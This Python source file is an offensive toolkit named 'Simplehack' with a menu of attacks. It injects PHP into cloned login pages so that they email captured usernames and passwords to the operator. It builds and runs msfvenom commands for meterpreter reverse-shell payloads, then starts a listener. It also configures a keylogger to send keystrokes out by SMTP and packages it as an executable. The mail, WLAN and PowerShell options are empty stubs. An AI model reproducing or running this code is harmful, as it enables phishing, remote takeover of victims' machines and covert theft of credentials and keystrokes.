from pyfiglet import Figlet
import terminaltables
from shutil import copyfile
import shutil
import os
import time



class website_attack():
    def __init__(self):
        path = "phishing/WebPages"

        my_list = os.listdir(path)

        a = 0
        b = 1
        c = 2
        d = 3

        x = 0

        liste = [["CHOOSE", " A WEBSITE", "FOR THE", "ATTACK"]]

        choose_liste = []

        zeilen = len(my_list) // 4

        e = 1
        f = zeilen + 1
        g = zeilen * 2 + 1
        h = zeilen * 3 + 1

        i = 0
        for file_names in range(len(my_list) // 4):
            choose_liste.append(my_list[i])
            i = i + 4

        i = 1
        for file_names in range(len(my_list) // 4):
            choose_liste.append(my_list[i])
            i = i + 4

        i = 2
        for file_names in range(len(my_list) // 4):
            choose_liste.append(my_list[i])
            i = i + 4

        i = 3
        for file_names in range(len(my_list) // 4):
            choose_liste.append(my_list[i])
            i = i + 4

        for z in range(zeilen):
            liste.append([str(e) + ") " + my_list[a], str(f) + ") " + my_list[b], str(g) + ") " + my_list[c],
                          str(h) + ") " + my_list[d]])
            a = a + 4
            b = b + 4
            c = c + 4
            d = d + 4

            e = e + 1
            f = f + 1
            g = g + 1
            h = h + 1

        table = terminaltables.AsciiTable(liste)

        print(table.table)

        # print(choose_liste)

        self.choosen_webside = choose_liste[int(input("Answer: ")) - 1]
        self.phishing_email = input("Please enter your email: ")
        self.storage_location = input("Please enter the storage location: ")
        self.redirect_location = input("Please enter the redirect location (for default type: d): ")


        self.generate_files(self.choosen_webside)

    def replace_string_in_file(self, filename, inputstring, outputstring):
        # Read in the file
        with open(filename, 'r') as file:
            filedata = file.read()

        # Replace the target string
        filedata = filedata.replace(inputstring, outputstring)

        # Write the file out again
        with open(filename, 'w') as file:
            file.write(filedata)

    def insert_line(self, filename, insert_pos, line):
        """
        Fügt der angegebenen Datei oberhalb der angegebenen Position die
        Zeile hinzu. Diese Funktion sollte nicht für große Dateien (50 MB)
        verwendet werden.
        """

        # Datei zum Lesen öffnen und alle Zeilen in eine Liste einlesen
        f = open(filename, "r")
        lines = f.readlines()
        f.close()

        # Wenn die Zeile nicht mit einem Zeilenumbruch endet, dann wird dieser
        # hinzugefügt.
        if not line.endswith("\n"):
            line += "\n"

        # Der Liste die neue Zeile hinzufügen
        lines.insert(insert_pos, line)

        # Speichern
        f = open(filename, "w")
        f.writelines(lines)
        f.close()


    def generate_files(self, website):
        path_to_copy = 'phishing/WebPages/' + website
        shutil.copytree(path_to_copy, self.storage_location)


        email_address = self.phishing_email
        header_location = self.redirect_location

        mail_to_string = '$mail_to = "' + email_address + '";'
        mail_message_string = "$msg = $_POST['username'] . '    ' . $_POST['password'];"
        mail_send_string = 'mail($mail_to,"Phishing",$msg) or die("unable to send email");'

        # print(mail_to_string)
        # print(mail_message_string)
        # print(mail_send_string)

        file_location = self.storage_location + "/login.php"

        self.insert_line(file_location, 3, mail_to_string)
        self.insert_line(file_location, 4, mail_message_string)
        self.insert_line(file_location, 5, mail_send_string)
        self.insert_line(file_location, 6, " ")

        self.replace_string_in_file(file_location, "<CUSTOM>", header_location)
        self.replace_string_in_file(file_location, "include 'ip.php';", "")


class metasploit_generator():
    '''For this class, you need to have the metasploit framework installed.'''

    # https://en.redinskala.com/starting-a-handler-with-metasploit/
    # https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/

    def __init__(self):

        self.payload_name = input("Please enter a filename for the payload (with file extension): ")
        self.payload_location = input("Please enter the storage location: ")

        print("a) Window")
        print("b) MacOs")
        print("c) Linux")
        print("d) Android")

        self.attack_opperating_system_question = input("Please choose an operating system: ")

        if self.attack_opperating_system_question == "a":
            self.attack_operating_system = "windows"
            self.attack_file_type = " -f exe"
        elif self.attack_opperating_system_question == "b":
            self.attack_operating_system = "osx"
            self.attack_file_type = "-f macho"
        elif self.attack_opperating_system_question == "c":
            self.attack_operating_system = "linux"
            self.attack_file_type = " -f elf"
        elif self.attack_opperating_system_question == "d":
            self.attack_operating_system = "android"
            self.attack_file_type = " R"

        print("a) reverse_tcp")
        print("b) reverse_http")

        self.attack_method_question = input("Please choose an attack method: ")

        if self.attack_method_question == "a":
            self.attack_method = "reverse_tcp"
        elif self.attack_method_question == "b":
            self.attack_method = "reverse_http"

        self.attacker_ip_adress = input("Please enter your ip adress: ")
        self.attacker_port_nuber = input("Please enter your port: ")

        self.command = "msfvenom -p " + self.attack_operating_system + "/meterpreter/" + self.attack_method + " LHOST=" + self.attacker_ip_adress + " LPORT=" + self.attacker_port_nuber + self.attack_file_type + " > " + self.payload_location + self.payload_name

        print("Your Command: ")
        print(self.command)
        print("")
        self.run_now = input("Do you want to run it now? (y/n): ")

        if self.run_now == "y" or self.run_now == "Y":
            self.run_command()
        else:
            quit("Ok. Bye!")

    def run_command(self):

        try:
            os.system(self.command)
            time.sleep(2)

            self.ask_run_listener = input(
                "Payload generation successfully finished. Do you want to run the listener now? (y/n): ")

            if self.ask_run_listener == "y" or self.ask_run_listener == "Y":
                self.run_listener()
            else:
                quit("Ok. Bye!")

        except:
            print("Could not run command.")

    def run_listener(self):

        try:

            self.listerner_string = "msfconsole -q -x 'use multi/handler;set payload " + self.attack_operating_system + "/meterpreter/" + self.attack_method + ";" + "set LHOST " + self.attacker_ip_adress + ";" + "set LPORT " + self.attacker_port_nuber + ";" + "exploit'"
            os.system(self.listerner_string)

        except:
            print("Could not start listener")


class keylogger_generator():
    def __init__(self):

        self.keylogger_output_location = input("Please enter the output location: ")


        self.keylogger_email = input("Please type your email address: ")
        self.keylogger_password = input("Please enter your email password: ")
        self.keylogger_smtp_server_address = input("Please enter your smtp server address: ")
        self.keylogger_smtp_server_port = input("Please enter your smtp server port: ")
        self.keylogger_character_limit = input("Please enter the character limit per mail: ")

        self.personalise_file()

    def replace_string_in_file(self, filename, inputstring, outputstring):
        # Read in the file
        with open(filename, 'r') as file:
            filedata = file.read()

        # Replace the target string
        filedata = filedata.replace(inputstring, outputstring)

        # Write the file out again
        with open(filename, 'w') as file:
            file.write(filedata)

    def personalise_file(self):


        copy_file_name = self.keylogger_output_location
        print(copy_file_name)

        self.complete_file_name = copy_file_name + "/keylogger.py"

        self.cd_name = copy_file_name

        os.mkdir(copy_file_name)
        shutil.copy("keylogger/keylogger.py", copy_file_name)

        self.replace_string_in_file(self.complete_file_name, "<paste_email_here>", self.keylogger_email)
        self.replace_string_in_file(self.complete_file_name, "<paste_password_here>", self.keylogger_password)
        self.replace_string_in_file(self.complete_file_name, "<paste_smtp_address_here>", self.keylogger_smtp_server_address)
        self.replace_string_in_file(self.complete_file_name, "<paste_smtp_port_here>", self.keylogger_smtp_server_port)
        self.replace_string_in_file(self.complete_file_name, "<paste_char_limit_here>", self.keylogger_character_limit)

        ask_conv_to_exe = input("Ok: The generation was successful. Do you want to generate an .exe file? (y/n): ")

        if ask_conv_to_exe == "y" or ask_conv_to_exe == "Y":
            self.convert_to_exe()
        else:
            quit("Ok. Have a nice day. Bye!")

    def convert_to_exe(self):
            os.system("cd " + self.cd_name)
            time.sleep(2)
            os.system("python -m PyInstaller --onefile " + self.complete_file_name)

            print("---- Complete ----")


def mail_attack():
    pass

def wlan_attack():
    pass

def powershell_attack():
    pass



def main_menu():
    os.system("color a")
    f = Figlet(font='slant')
    rend_text = f.renderText('Simplehack')
    print(rend_text)
    print("----------------- Created by Dante -----------------")
    print("")
    print("Please choose an option: ")
    print("")
    print("1) Website phishing attack")
    print("2) Reverse shell attack")
    print("3) Keylogger attack")
    print("4) Mass Mailer attacks")
    print("5) WLAN Attack (WPA2)")
    print("6) Powershell attack")
    print("")
    print("99) Exit")

    choose_attack = int(input())

    if choose_attack == 1:
        website_attack()
    elif choose_attack == 2:
        metasploit_generator()
    elif choose_attack == 3:
        keylogger_generator()
    elif choose_attack == 4:
        mail_attack()
    elif choose_attack == 5:
        wlan_attack()
    elif choose_attack == 6:
        powershell_attack()
    elif choose_attack == 99:
        quit("Bye!")


main_menu()